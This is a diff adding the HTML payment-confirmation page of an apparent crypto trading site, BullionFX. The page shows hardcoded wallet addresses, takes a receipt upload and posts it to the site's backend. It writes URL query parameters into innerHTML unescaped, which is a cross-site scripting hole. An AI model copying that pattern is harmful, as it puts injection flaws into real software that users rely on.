@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BullionFX - Confirm Payment</title>
+    <link rel="stylesheet" href="translate.css">
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+    <style>
+      @keyframes gradientBG {
+        0% {
+          background-position: 0% 50%;
+        }
+        50% {
+          background-position: 100% 50%;
+        }
+        100% {
+          background-position: 0% 50%;
+        }
+      }
+      body {
+        font-family: "Arial", sans-serif;
+        background: linear-gradient(-45deg, #000000, #001f3f, #0066cc, #000000);
+        background-size: 400% 400%;
+        animation: gradientBG 15s ease infinite;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+        color: #ffffff;
+      }
+      .confirm-container {
+        background-color: rgba(0, 0, 0, 0.8);
+        padding: 2rem;
+        border-radius: 8px;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        width: 320px;
+      }
+      .logo-container {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-bottom: 1rem;
+      }
+      .logo {
+        font-size: 24px;
+        font-weight: bold;
+        color: #0066cc;
+      }
+      .bull-icon {
+        width: 40px;
+        height: 40px;
+        margin-right: 10px;
+        fill: #0066cc;
+      }
+      h1 {
+        text-align: center;
+        color: #0066cc;
+        margin-bottom: 1.5rem;
+      }
+      .address-container {
+        background-color: #1a1a1a;
+        padding: 0.75rem;
+        border: 1px solid #333333;
+        border-radius: 4px;
+        word-break: break-all;
+        margin-bottom: 1rem;
+        font-family: monospace;
+        font-size: 14px;
+        position: relative;
+      }
+      .address {
+        padding-right: 30px;
+      }
+      .copy-button {
+        display: block;
+        width: 100%;
+        padding: 0.75rem;
+        background-color: #1a1a1a;
+        color: #0066cc;
+        border: 1px solid #333333;
+        border-radius: 4px;
+        cursor: pointer;
+        font-size: 16px;
+        font-weight: bold;
+        margin-top: 0.5rem;
+        margin-bottom: 1rem;
+        transition: background-color 0.3s ease, color 0.3s ease;
+      }
+      .copy-button:hover {
+        background-color: #0066cc;
+        color: white;
+      }
+      button {
+        display: block;
+        width: 100%;
+        padding: 0.75rem;
+        background-color: #0066cc;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        font-size: 16px;
+        font-weight: bold;
+        margin-bottom: 1rem;
+        transition: background-color 0.3s ease;
+      }
+      button:hover {
+        background-color: #004c99;
+      }
+      form {
+        display: flex;
+        flex-direction: column;
+      }
+      label {
+        margin-top: 1rem;
+        color: #ffffff;
+        font-weight: bold;
+      }
+      input[type="file"] {
+        margin-top: 0.5rem;
+        padding: 0.5rem;
+        background-color: #1a1a1a;
+        border: 1px solid #333333;
+        border-radius: 4px;
+        font-size: 14px;
+        color: #ffffff;
+      }
+      #processing-message {
+        display: none;
+        text-align: center;
+        color: #0066cc;
+        margin-top: 1rem;
+        font-weight: bold;
+      }
+      #dashboard-link {
+        display: none;
+        text-align: center;
+        margin-top: 1rem;
+      }
+      #dashboard-link a {
+        color: #0066cc;
+        text-decoration: none;
+        font-weight: bold;
+      }
+      #dashboard-link a:hover {
+        text-decoration: underline;
+      }
+    </style>
+  </head>
+  <body>
+     <div class="translate-cont">
+        <button class="toggle-button" onclick="toggleDiv()">Translate</button>
+    </div>
+            <div class="gtranslate_wrapper toggle-div" id="myDiv"></div>
+<script>window.gtranslateSettings = {"default_language":"en","wrapper_selector":".gtranslate_wrapper","switcher_vertical_position":"top","float_switcher_open_direction":"bottom"}</script>
+<script src="https://cdn.gtranslate.net/widgets/latest/float.js" defer></script>
+    
+    <script>
+        function toggleDiv() {
+            const div = document.getElementById('myDiv');
+            div.classList.toggle('show');
+        }
+    </script>
+    <div class="confirm-container">
+      <div class="logo-container">
+        <svg
+          class="bull-icon"
+          viewBox="0 0 24 24"
+          xmlns="http://www.w3.org/2000/svg"
+        >
+          <path
+            d="M20.5 8.5c-.4-1.4-1.6-2.5-3.1-2.5H19c.6-1.2.8-2.7.3-4-.7-1.8-2.5-2.9-4.4-2.9-1.3 0-2.5.5-3.4 1.4-.9-.9-2.1-1.4-3.4-1.4-1.9 0-3.7 1.1-4.4 2.9-.5 1.3-.3 2.8.3 4h1.6c-1.5 0-2.7 1.1-3.1 2.5-.4 1.4.1 2.9 1.2 3.8l3.8 3.8c.6.6 1.4.9 2.2.9s1.6-.3 2.2-.9l3.8-3.8c1.1-.9 1.6-2.4 1.2-3.8zM12 15c-.6 0-1-.4-1-1s.4-1 1-1 1 .4 1 1-.4 1-1 1z"
+          />
+        </svg>
+        <div class="logo">BullionFX</div>
+      </div>
+      <h1>Confirm Payment</h1>
+      <div id="payment-info"></div>
+      <div class="address-container">
+        <div id="address" class="address"></div>
+      </div>
+      <button class="copy-button" onclick="copyAddress()">
+        <i class="fas fa-copy"></i> Copy Address
+      </button>
+      <form id="confirm-form" onsubmit="showProcessingMessage(event)">
+        <label for="receipt">
+          <i class="fas fa-file-upload"></i> Upload Payment Receipt:
+        </label>
+        <input
+          type="file"
+          id="receipt"
+          name="receipt"
+          required
+          accept="image/*,.pdf"
+        />
+        <button type="submit">
+          <i class="fas fa-check"></i> Submit Payment
+        </button>
+      </form>
+      <div id="processing-message">
+        <i class="fas fa-spinner fa-spin"></i> Your payment is being processed.
+        You'll receive your funds in your dashboard in 1-2 hours.
+      </div>
+      <div id="dashboard-link">
+        <a href="dashboard.html"
+          ><i class="fas fa-tachometer-alt"></i> Go to Dashboard</a
+        >
+      </div>
+    </div>
+    <script>
+      if (!navigator.clipboard && !document.execCommand) {
+        console.warn("Clipboard operations are not supported in this browser.");
+        document.querySelector(".copy-button").style.display = "none";
+      }
+      const addresses = {
+        BTC: "1KVBny3MwQjFwPKmsRnjbpcdDq93hXfGgg",
+        ETH: "0x5c44e4f4f9251f43d647f5c8a7b799bb480bd674",
+        USDT: "TGQFQQQsKPeMW98WGA9rU4go5aWBeGt3X2",
+      };
+
+      function getQueryParam(param) {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get(param);
+      }
+
+      function displayPaymentInfo() {
+        const amount = getQueryParam("amount");
+        const method = getQueryParam("payment-method");
+        const address = addresses[method];
+
+        const paymentInfo = document.getElementById("payment-info");
+        paymentInfo.innerHTML = `
+                <p><strong><i class="fas fa-coins"></i> Amount:</strong> $${amount} worth of ${method}</p>
+                <p><strong><i class="fas fa-wallet"></i> Payment Method:</strong> ${method}</p>
+                <p><strong><i class="fas fa-key"></i> Address:</strong></p>
+            `;
+
+        document.getElementById("address").textContent = address;
+      }
+
+      function copyAddress() {
+        const addressElement = document.getElementById("address");
+        const address = addressElement.textContent;
+        const copyButton = document.querySelector(".copy-button");
+
+        // Create a temporary textarea element to hold the text
+        const tempTextArea = document.createElement("textarea");
+        tempTextArea.value = address;
+        document.body.appendChild(tempTextArea);
+
+        // Select and copy the text
+        tempTextArea.select();
+        document.execCommand("copy");
+
+        // Remove the temporary textarea
+        document.body.removeChild(tempTextArea);
+
+        // Update button text to show feedback
+        copyButton.textContent = "Copied!";
+        setTimeout(() => {
+          copyButton.innerHTML = '<i class="fas fa-copy"></i> Copy Address';
+        }, 2000);
+      }
+
+      function showProcessingMessage(event) {
+        event.preventDefault();
+        document.getElementById("confirm-form").style.display = "none";
+        document.getElementById("processing-message").style.display = "block";
+        document.getElementById("dashboard-link").style.display = "block";
+      }
+      const user = localStorage.getItem("user");
+      const { id } = JSON.parse(user);
+      document.addEventListener("DOMContentLoaded", function () {
+        const form = document.getElementById("confirm-form");
+        form.addEventListener("submit", function (e) {
+          e.preventDefault();
+
+          const formData = new FormData(form);
+          const data = {};
+          formData.forEach((value, key) => {
+            data[key] = value;
+          });
+
+          fetch(
+            `https://bullion-fx-server.onrender.com/api/v1/user/transaction/${id}`,
+            {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({ ...data, type: "buy" }),
+            }
+          )
+            .then((response) => response.json())
+            .then((data) => {
+              console.log("Success:", data);
+              window.location.href = "success.html";
+            })
+            .catch((error) => {
+              console.error("Error:", error);
+            });
+        });
+      });
+
+      displayPaymentInfo();
+    </script>
+  </body>
+</html>
